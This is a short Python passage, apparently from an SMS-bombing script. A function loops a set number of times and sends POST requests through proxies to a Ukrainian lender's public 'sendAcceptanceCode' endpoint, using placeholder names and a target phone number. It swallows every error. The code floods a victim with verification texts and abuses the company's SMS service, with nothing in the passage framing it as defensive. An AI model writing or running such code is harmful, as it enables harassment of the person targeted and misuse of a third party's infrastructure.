...
def ukr():
        for _ in track(range(run)):
                ...
                try:
                        ...
                        pass
                try:
                        requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode", json={"firstName": "Синица", "lastName": "Сеня", "mobilePhone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
